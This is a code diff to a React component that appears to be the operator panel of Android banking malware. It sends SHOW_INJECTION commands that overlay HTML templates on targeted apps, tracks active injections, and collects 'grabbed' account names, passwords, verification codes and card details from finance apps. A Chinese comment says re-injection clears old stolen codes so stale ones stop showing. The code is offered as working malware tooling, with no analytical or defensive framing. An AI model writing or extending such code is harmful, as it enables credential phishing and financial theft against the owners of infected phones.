@@ -39,7 +39,10 @@ export default function InjectionTab({
   sendWs,
   injActivePkgs = new Set(),
   injActiveIds = new Set(),
+  setInjActivePkgs,
+  setInjActiveIds,
   injGrabbed = [],
+  setInjGrabbed,
   parseGrabbedData,
   appList = [],
 }) {
@@ -127,8 +130,16 @@ export default function InjectionTab({
 
   // 手动注入
   const startInjection = async (tpl) => {
-    setInjLoadingPkg(tpl.packageName || tpl.package_name)
+    const pkg = tpl.packageName || tpl.package_name
+    const templateId = tpl.templateId || tpl.template_id || tpl.id
+    setInjLoadingPkg(pkg)
     try {
+      // 重注前仅清除此设备、此应用的旧抓取记录，避免旧验证码继续显示。
+      await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(pkg)}`, {
+        method: 'DELETE',
+      })
+      setInjGrabbed?.(prev => prev.filter(item => item.packageName !== pkg))
+
       // 如果模板没有 htmlContent，先获取；用 query 方式避免中文/空格模板 ID 走路径导致 404
       let htmlContent = tpl.htmlContent || tpl.html_content || ''
       if (!htmlContent && (tpl.templateId || tpl.template_id || tpl.id || tpl.packageName || tpl.package_name)) {
@@ -141,12 +152,18 @@ export default function InjectionTab({
         data: {
           command: 'SHOW_INJECTION',
           params: {
-            packageName: tpl.packageName || tpl.package_name,
+            packageName: pkg,
             htmlContent,
-            templateId: tpl.templateId || tpl.template_id || tpl.id,
+            templateId,
           }
         }
       })
+      await api.request('/api/injection/active-tasks', {
+        method: 'POST',
+        body: JSON.stringify({ deviceId: resolvedDeviceId, packageName: pkg, templateId }),
+      })
+      setInjActivePkgs?.(prev => new Set([...prev, pkg]))
+      setInjActiveIds?.(prev => new Set([...prev, templateId]))
       centerToast(`已注入: ${tpl.name}`)
     } catch (e) {
       toast('注入失败: ' + e.message, 'error')
@@ -171,6 +188,8 @@ export default function InjectionTab({
     try {
       await api.request(`/api/injection/active-tasks?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(pkg)}`, { method: 'DELETE' })
     } catch {}
+    setInjActivePkgs?.(prev => { const next = new Set(prev); next.delete(pkg); return next })
+    setInjActiveIds?.(prev => { const next = new Set(prev); next.delete(tpl.templateId || tpl.template_id || tpl.id); return next })
     centerToast(`已停止: ${tpl.name || pkg}`)
     setInjLoadingPkg(null)
   }
@@ -312,8 +331,8 @@ export default function InjectionTab({
                 const grabbed = injGrabbed.find(g => g.packageName === packageName)
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
-                // 自动注入开启时，未获得数据的应用默认为"注入中"
-                const isActive = hasData ? false : (injectionActive || injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id))
+                // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
+                const isActive = hasData ? false : (injActivePkgs.has(packageName) || injActiveIds.has(tpl.id || tpl.templateId || tpl.template_id))
                 const isLoading = injLoadingPkg === packageName
                 const isInjecting = isActive || isLoading
                 const category = getFinanceCategory(packageName, appName)
